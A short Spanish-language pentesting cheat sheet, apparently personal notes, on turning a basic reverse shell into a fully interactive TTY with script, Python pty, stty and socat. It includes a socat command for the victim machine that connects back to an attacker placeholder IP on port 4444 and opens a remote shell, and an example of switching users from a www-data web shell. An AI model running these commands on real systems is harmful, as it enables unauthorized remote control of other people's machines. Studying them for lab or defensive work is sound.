
---
Tags: #shell #reverseshell #interactiva #tty #bonita #consola #cmd

## 1️⃣ Mejorar la shell básica con `script`

Ya lo hiciste, pero lo dejo estructurado:

`script /dev/null -c bash`

Esto te da una TTY “mejorada”, pero todavía puede tener problemas con `su`.

---

## 2️⃣ Usar `python` para spawnear una pty

Si tienes Python en la víctima:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Ahora tienes un pseudo-terminal.

---

## 3️⃣ Configurar terminal desde tu máquina atacante

En tu **Kali**:

1. Suspende la shell con `Ctrl+Z`.
    
2. Ejecuta:
    
```bash
stty raw -echo; fg
```

```bash
reset xterm
```
3. Ajusta variables de entorno:
    
    ```bash
    export TERM=xterm 
    export SHELL=bash 
    stty rows 44 columns 120
    ```
    

Con esto, `su` ya debería dejarte escribir la contraseña sin que se rompa la shell.

---

## 4️⃣ Usar `socat` para obtener TTY full interactiva (mejor opción)

En tu máquina atacante:

``socat file:`tty`,raw,echo=0 tcp-listen:4444``

En la víctima:

`socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:<TU_IP>:4444`

👉 Esto te da una **shell casi idéntica a SSH**, donde `su`, `nano`, `vim` funcionan sin problema.

---

# 🎯 Ejemplo práctico con `su`

1. Desde tu shell web (www-data):
    
    `python3 -c 'import pty; pty.spawn("/bin/bash")' export TERM=xterm`
    
2. En tu Kali:
    
    `stty raw -echo; fg`
    
3. En la víctima:
    
    `su nombre_usuario`
    
    Escribe la contraseña (no se muestra al escribir, pero se está registrando).